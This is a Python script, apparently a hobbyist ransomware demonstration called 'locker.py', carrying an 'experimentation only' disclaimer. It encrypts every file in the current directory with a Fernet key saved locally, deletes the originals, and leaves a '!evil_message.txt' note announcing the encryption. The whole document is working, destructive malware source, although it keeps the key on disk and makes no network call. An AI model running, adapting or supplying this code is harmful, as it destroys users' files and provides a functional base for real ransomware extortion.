#!/usr/bin/env python3
# Author raresteak
# locker.py encrpts files
# this script is for experimentation only
# USE AT YOUR OWN RISK
import os
from cryptography.fernet import Fernet
files = []
for file in os.listdir():
    if file == "locker.py" or file == "unlocker.py" or \
       file == ".key" or os.path.isdir(file):
        continue
    elif file == "!evil_message.txt":
        # prevent double encryption by looking for locker.py message file
        exit()
    else:
        files.append(file)
if len(files) > 0:
    # Generate key
    key = Fernet.generate_key()
    # save key
    keyFh = open('.key', 'wb')
    keyFh.write(key)
    keyFh.close()
    for file in files:
        print("Encrypting: " + file)
        # Read contents of file
        ro_fh = open(file, 'rb')
        # need to use read() instead of readlines() with feret
        # readlines() produces a list and Fernet doesn't take the list
        contents = ro_fh.read()
        ro_fh.close()
        # load key
        fernetHandle = Fernet(key)
        # print(contents)
        # Encrypt file contents
        encryptedContents = fernetHandle.encrypt(contents)
        # print(encryptedContents)
        newFileName = str(file + ".encrypted")
        # Write the new file
        rw_fh = open(newFileName, 'wb')
        rw_fh.write(encryptedContents)
        rw_fh.close()
        # Remove old file
        os.remove(file)
        print("Encrypted: " + newFileName)
    mymessage = "Your files are encrypted, have a nice day."
    print(mymessage)
    mymessageFh = open("!evil_message.txt", "w")
    mymessageFh.writelines(mymessage)
    mymessageFh.close()
